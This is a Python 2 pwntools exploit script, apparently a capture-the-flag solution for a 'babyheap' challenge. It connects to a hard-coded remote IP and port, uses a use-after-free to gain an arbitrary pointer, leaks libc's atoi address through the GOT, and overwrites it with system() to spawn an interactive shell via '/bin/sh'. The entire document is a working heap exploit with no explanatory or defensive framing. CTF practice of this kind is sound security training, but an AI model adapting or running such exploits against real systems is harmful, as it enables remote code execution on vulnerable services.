#!/usr/bin/python2
from pwn import *

def add():
    p.sendlineafter("> ", "1")

def edit(data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Content? ", data)

def show():
    p.sendlineafter("> ", "3")

def delete():
    p.sendlineafter("> ", "4")

def fill(data):
    p.sendlineafter("> ", "1337")
    p.sendafter("Fill ", data)

got_atoi = 0x0000000000602060
bss = 0x00000006020A0

with context.quiet:
    #p = process("./babyheap", env = {"LD_PRELOAD":"./libc.so.6"})
    p = remote("51.68.189.144", 31005)
    #p = remote("35.243.188.20", 2000)

    p.recvline()

    #UAF to get arbitrary pointer
    add()
    delete()
    edit(p64(bss)) #On the next-next malloc, give me a pointer to bss (0x6020a0)
    add()
    #Now the next malloc will give us the pointer.

    #Malloc 
    #Zero out our "uses" and point "buf" to got_atoi
    fill((chr(0x0)*0x28) + p64(got_atoi))

    #Leak libc address (atoi)
    show()
    p.recvuntil("Content: ")
    libc_atoi= u64(p.recvline().strip().ljust(8, chr(0x0)))
    print "Leaked libc_atoi: %s" % hex(libc_atoi)

    #Calculate system
    offset_to_system = 0xf010
    libc_system = libc_atoi + offset_to_system
    print "Calced libc_system: %s" % hex(libc_system)

    #Win
    edit(p64(libc_system))
    p.sendlineafter("> ", "/bin/sh")
    p.interactive()